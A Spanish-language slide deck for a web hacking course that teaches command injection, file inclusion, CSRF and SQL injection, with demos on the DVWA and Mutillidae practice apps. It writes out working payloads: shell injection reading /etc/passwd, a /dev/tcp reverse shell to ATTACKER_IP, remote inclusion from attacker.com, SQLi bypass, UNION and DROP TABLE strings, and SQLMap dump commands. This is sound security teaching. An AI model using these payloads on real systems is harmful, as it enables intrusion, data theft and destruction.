# Deck — Clase 1 · Módulo 2

> Curso de Web Hacking
> Duración: 2 horas
> Formato: teoría + demos guiadas

---

# Web Hacking
## Módulo 2 — Clase 1
### Command Injection, File Inclusion, SQL Injection y automatización

---

## Recap breve: Módulo 1

- Modelo cliente-servidor y por qué el cliente **no es confiable**
- HTTP, cookies y headers de seguridad
- Reconocimiento y enumeración para encontrar superficie de ataque
- Un `200`, `403` o `500` ya nos dice algo sobre el target
- La idea clave para hoy: **si detectás dónde entra el dato, podés razonar dónde se rompe**

---

## Antes de explotar: la idea central del módulo

La mayoría de los ataques clásicos aparecen cuando la aplicación **mezcla datos con instrucciones**.

Ejemplos:
- En **SQLi**, la base interpreta datos como consulta
- En **XSS**, el navegador interpreta datos como JavaScript
- En **Command Injection**, el sistema interpreta datos como comandos
- En **File Inclusion**, el servidor interpreta rutas controladas por el usuario como archivos válidos

---

## ¿Por qué estos ataques siguen vigentes?

- No dependen de tecnologías "viejas"
- Dependen de **decisiones inseguras de diseño**
- Cada campo, parámetro, cookie o fragmento de DOM es una posible entrada
- La app moderna puede usar React, contenedores y cloud... y seguir siendo vulnerable

> No peleamos contra una tecnología; peleamos contra la **confianza injustificada en el input**.

---

## Agenda de hoy

| Bloque | Contenido | Tiempo aprox. |
|---|---|---|
| **1** | Command Injection + File Inclusion + CSRF | ~35 min |
| 🧪 | Demo 1: Command Injection en DVWA | ~15 min |
| **2** | SQL Injection: fundamentos y explotación manual | ~40 min |
| 🧪 | Demo 2: SQLi guiada en DVWA | ~20 min |
| **3** | SQLMap: automatización con criterio | ~20 min |
| 🧭 | Proyecto integrador y cierre | ~10 min |

---

## Command Injection

En Command Injection, el input termina siendo interpretado por el shell.

Suele aparecer en funcionalidades que invocan comandos del SO:
- diagnósticos tipo `ping`
- conversión de archivos
- procesamiento de imágenes
- wrappers de herramientas del sistema

---

## Command Injection: operadores

| Operador | Función | Ejemplo |
|---|---|---|
| `;` | Ejecutar secuencialmente | `127.0.0.1; whoami` |
| `&&` | Ejecutar si el anterior fue exitoso | `127.0.0.1 && cat /etc/passwd` |
| `\|\|` | Ejecutar si el anterior falló | `invalid \|\| id` |
| `\|` | Pipe al siguiente comando | `127.0.0.1 \| ls` |
| `` `cmd` `` | Sustitución de comando | `` 127.0.0.1 `whoami` `` |
| `$(cmd)` | Sustitución de comando | `$(cat /etc/passwd)` |

Ejemplo con curl:

```bash
curl -s "http://target/ping?host=127.0.0.1;id"
curl -s -X POST http://target/diagnostic -d "ip=127.0.0.1|cat /etc/passwd"
```

---

## 🧪 Demo guiada 1 — Command Injection en DVWA

**Target:** `Command Execution` en DVWA con `Security = Low`

Secuencia sugerida en vivo:
1. Ejecutar un `ping` válido para fijar el comportamiento normal
2. Romper la lógica con `127.0.0.1; cat /etc/passwd`
3. Confirmar alcance con `127.0.0.1; uname -a`
4. Explicar por qué `;` funciona: la app concatena input y shell
5. Cerrar con el impacto posible: lectura de archivos, enumeración y escalamiento en un lab controlado

> La demo no busca una reverse shell en clase.
> Busca mostrar el momento exacto en que el dato deja de ser dato y pasa a ser comando.

---

## Command Injection: impacto y escalamiento

Si el proceso corre con privilegios elevados, el atacante puede:
- Leer o modificar archivos sensibles
- Crear usuarios o tareas persistentes (cron)
- Instalar backdoors
- Pivotar hacia otros sistemas internos

```bash
# Reverse shell (en un lab controlado)
; bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'
```

Mitigación:
- Evitar llamadas al shell (`exec`, `system`, `popen`)
- Usar APIs nativas del lenguaje
- Allowlists estrictas
- Mínimo privilegio en el proceso

---

## File Inclusion y Path Traversal

Cuando el usuario controla rutas, el servidor puede leer o incluir archivos indebidos.

**LFI (Local File Inclusion):**

```
http://target/page.php?file=../../../../etc/passwd
http://target/page.php?file=....//....//....//etc/passwd
```

**RFI (Remote File Inclusion):**

```
http://target/page.php?file=http://attacker.com/shell.php
```

**Path Traversal con encoding:**

```
..%2f..%2f..%2fetc%2fpasswd
..%252f..%252f..%252fetc%252fpasswd    (doble encoding)
```

---

## File Inclusion: encadenamiento

Cadena de ataque típica:
1. Subida de archivo sin validación real
2. LFI para incluir/ejecutar el archivo subido
3. Ejecución de código en el servidor

Archivos interesantes para LFI:

| SO | Archivo |
|---|---|
| Linux | `/etc/passwd`, `/etc/shadow`, `/proc/self/environ` |
| Linux | `/var/log/apache2/access.log` (log poisoning) |
| Windows | `C:\Windows\win.ini`, `C:\boot.ini` |
| App | `config.php`, `.env`, `web.xml` |

---

## CSRF (Cross-Site Request Forgery)

CSRF no necesita robar la sesión.

Aprovecha que el navegador:
- ya está autenticado
- envía cookies automáticamente

Si la app no valida origen/intención, un atacante puede forzar acciones:
- cambiar contraseña
- modificar perfil
- transferir dinero
- aprobar operaciones

Ejemplo de formulario malicioso:

```html
<form action="http://bank.com/transfer" method="POST">
  <input type="hidden" name="to" value="attacker">
  <input type="hidden" name="amount" value="10000">
</form>
<script>document.forms[0].submit();<\/script>
```

---

## SQL Injection (SQLi)

SQLi ocurre cuando la aplicación arma consultas concatenando input del usuario.

La base de datos deja de ver:
- un valor de entrada

y empieza a ver:
- **parte de la consulta**

Código vulnerable típico (PHP):

```php
$query = "SELECT * FROM users WHERE user='" . $_POST['user'] . "'
          AND pass='" . $_POST['pass'] . "'";
```

---

## ¿Dónde aparece SQLi?

Entradas típicas:
- formularios de login
- buscadores
- filtros por ID
- parámetros numéricos en URL
- APIs que construyen consultas dinámicas

Ejemplos de consultas vulnerables:

```sql
SELECT * FROM users WHERE user = '$input'
SELECT * FROM products WHERE id = $id
SELECT * FROM articles WHERE title LIKE '%$search%'
```

---

## Detectar SQLi: primeras señales

Antes de explotar, confirmamos. Indicadores:

| Entrada | Respuesta esperada si es vulnerable |
|---|---|
| `'` | Error SQL visible o cambio de comportamiento |
| `' OR '1'='1` | Bypass de condición (login, filtro) |
| `1 AND 1=1` vs `1 AND 1=2` | Respuesta distinta = inyección numérica |
| `' AND 'a'='a` vs `' AND 'a'='b` | Respuesta distinta = inyección string |

Con curl:

```bash
# Probar comilla simple en parámetro de login
curl -s -X POST http://target/login \
  -d "user=admin'&pass=test" | grep -i "error\|sql\|syntax"
```

---

## Inyección básica: alterar la lógica

Payload clásico para bypass de autenticación:

```sql
' OR '1'='1' --
```

La consulta resultante:

```sql
SELECT * FROM users WHERE user='' OR '1'='1' --' AND pass='...'
```

Otros payloads de bypass:

```sql
' OR 1=1 --
' OR 1=1 #
admin' --
' OR ''='
```

---

## Inyecciones avanzadas: UNION SELECT

Cuando la respuesta se refleja en pantalla, extraemos datos de otras tablas:

```sql
' UNION SELECT NULL,NULL,NULL --
```

Primero determinamos el número de columnas:

```sql
' ORDER BY 1 --    → OK
' ORDER BY 2 --    → OK
' ORDER BY 3 --    → OK
' ORDER BY 4 --    → ERROR → tiene 3 columnas
```

Luego extraemos:

```sql
' UNION SELECT user(), database(), version() --
' UNION SELECT table_name,NULL,NULL FROM information_schema.tables --
```

---

## `information_schema`: por qué importa

En MySQL/MariaDB, `information_schema` es una base de datos de **metadatos**.

No guarda el negocio de la app.
Guarda la **estructura** de la base:
- qué bases existen
- qué tablas tiene cada base
- qué columnas tiene cada tabla
- tipos de datos, privilegios y más

Por eso aparece tanto en SQLi:
- primero confirmás que podés inyectar
- después enumerás la estructura
- recién ahí pedís datos concretos

---

## SQL básico sobre una base real

Comandos básicos en MariaDB / MySQL:

```sql
SHOW DATABASES;
USE curso_web_hacking;
SHOW TABLES;
DESCRIBE users;
SHOW COLUMNS FROM users;
```

Qué muestra cada comando:
- **databases** = qué esquemas existen
- **tables** = qué objetos hay en una base
- **columns** = cómo está modelada cada tabla

---

## Enumeración con `information_schema`

Listar tablas de una base:

```sql
SELECT table_name
FROM information_schema.tables
WHERE table_schema = 'curso_web_hacking';
```

Listar columnas de una tabla:

```sql
SELECT column_name, data_type
FROM information_schema.columns
WHERE table_schema = 'curso_web_hacking'
  AND table_name = 'users';
```

Relacionarlo con SQLi ayuda a explicar por qué payloads como este funcionan:

```sql
' UNION SELECT table_name,NULL,NULL FROM information_schema.tables --
```

---

## Query Chaining (Stacked Queries)

Algunos motores permiten encadenar consultas con `;`:

```sql
'; DROP TABLE logs; --
'; UPDATE users SET role='admin' WHERE user='attacker'; --
'; INSERT INTO users VALUES('hacker','pass123','admin'); --
```

No todos los drivers lo permiten:
- **MySQL + PHP (mysqli):** sí con `multi_query()`
- **PostgreSQL:** sí
- **SQLite:** sí
- **MySQL + PHP (mysql_query):** no

---

## 🧪 Demo guiada 2 — SQLi en DVWA

**Target:** `SQL Injection` en DVWA con `Security = Low`

Secuencia sugerida en vivo:
1. Probar un valor normal como `1` para entender la respuesta base
2. Ingresar `'` para buscar error o cambio de comportamiento
3. Confirmar bypass lógico con `' or '0'='0`
4. Pasar a enumeración con `UNION SELECT`
   - `%' or 0=0 union select null, version() #`
   - `%' or 0=0 union select null, user() #`
   - `%' and 1=0 union select null, table_name from information_schema.tables #`
5. Cerrar conectando el hallazgo con impacto real

| Pilar | Ejemplo con SQLi |
|---|---|
| **Confidencialidad** | Leer usuarios, hashes o nombres de tablas |
| **Integridad** | Alterar datos si la inyección permite `UPDATE` o `INSERT` |
| **Disponibilidad** | Romper consultas o degradar el servicio con payloads agresivos |

---

## SQLMap: automatización con criterio

SQLMap automatiza:
- detección del punto de inyección
- fingerprint del motor DB
- enumeración de bases, tablas y columnas
- extracción de datos
- bypass de WAFs

Estructura base:

```bash
sqlmap -u "http://target/product.php?id=1"
```

Pero automatizar no significa apagar el criterio.

---

## SQLMap: flags esenciales

| Opción | Función |
|---|---|
| `-u URL` | URL con parámetro inyectable |
| `--data="user=x&pass=y"` | POST data |
| `--cookie="PHPSESSID=abc"` | Cookie de sesión |
| `--technique=BEUSTQ` | Técnicas a probar |
| `--level=1-5` | Profundidad de pruebas |
| `--risk=1-3` | Riesgo (1=safe, 3=agresivo) |
| `--batch` | No interactivo |
| `--dbs` | Enumerar bases de datos |
| `-D nombre --tables` | Tablas de una base |
| `-D nombre -T tabla --dump` | Extraer datos |

---

## SQLMap: flujo práctico completo

```bash
# 1. Detectar inyección
sqlmap -u "http://target/page.php?id=1" --batch

# 2. Enumerar bases de datos
sqlmap -u "http://target/page.php?id=1" --dbs --batch

# 3. Enumerar tablas de una base
sqlmap -u "http://target/page.php?id=1" -D webapp --tables --batch

# 4. Extraer columnas
sqlmap -u "http://target/page.php?id=1" -D webapp -T users --columns --batch

# 5. Dump selectivo
sqlmap -u "http://target/page.php?id=1" -D webapp -T users \
  -C "username,password" --dump --batch

# 6. Con POST y cookie
sqlmap -u "http://target/login" --data="user=test&pass=test" \
  --cookie="session=abc123" --level=3 --risk=2 --batch
```

---

## SQLMap: buenas prácticas

1. **Confirmar manualmente antes** — si no entendés la falla, SQLMap tampoco la va a explicar
2. **Empezar con level=1, risk=1** — subir solo si no detecta
3. **Extraer solo lo necesario** — `--dump` sin filtros puede tardar horas
4. **Guardar evidencia** — usar `--output-dir`
5. **No usar en producción sin autorización** — genera cientos de requests ruidosos

---

## Manual vs automatizado

No son enfoques enemigos.
Se complementan.

| Enfoque | Qué aporta |
|---|---|
| **Manual** | Te muestra dónde entra el dato, cómo se rompe la lógica y qué evidencia ves |
| **Automatizado** | Acelera detección, enumeración y extracción cuando ya entendés el punto vulnerable |

Idea clave:
- **manual primero** para entender la falla
- **automatización después** para escalar con criterio
- si no entendés el vector, la herramienta solo genera ruido

> La habilidad no es memorizar flags.
> La habilidad es saber **qué validar, cuándo automatizar y qué pedirle a la herramienta**.

---

## Mitigaciones modernas

| Vulnerabilidad | Mitigación fuerte |
|---|---|
| **SQLi** | Consultas parametrizadas / prepared statements |
| **Command Injection** | Evitar shell, allowlists, mínimo privilegio |
| **File Inclusion** | Rutas controladas, normalización, no incluir input crudo |
| **CSRF** | Tokens anti-CSRF, `SameSite`, validación de origen |

Idea clave:
- Bloquear caracteres no alcanza
- La mitigación buena **cambia el diseño**, no solo el filtro

---

## Proyecto integrador — Para casa

Target propuesto: **Mutillidae II**

Consignas:
1. Identificar un formulario vulnerable a SQLi
2. Explotar manualmente (al menos 2 payloads distintos)
3. Repetir con SQLMap
4. Obtener todas las tablas de la base de datos
5. Comparar enfoque manual vs automatizado

Entrega sugerida:
- evidencia (capturas)
- payloads usados
- comando SQLMap completo
- hallazgos
- conclusión comparativa

---

## Cierre de la clase 1

## Resumen de lo aprendido

- Command Injection aparece cuando el input llega a una shell
- File Inclusion y CSRF muestran otras formas de explotar confianza implícita del servidor o del navegador
- SQLi aparece cuando la app mezcla input con consultas
- Primero entendemos el vector manualmente; después automatizamos con criterio
- Las mitigaciones fuertes cambian el diseño, no solo filtran caracteres

---

## Idea final

> **No atacamos tecnologías "viejas": atacamos decisiones inseguras sobre cómo una aplicación interpreta datos controlados por el usuario.**

## Próxima clase

- Blind SQL Injection: boolean-based y time-based
- XSS: tipos y contextos de ejecución
- Stored, Reflected y DOM XSS
- Source → sink y cómo pensar el flujo en navegador
- Bypass de filtros y control del navegador con BeEF

---

## ¡Gracias!

Gracias por acompañar la clase. La próxima arrancamos con Blind SQLi y seguimos con XSS y el modelo mental para entender cómo el navegador ejecuta input no confiable.
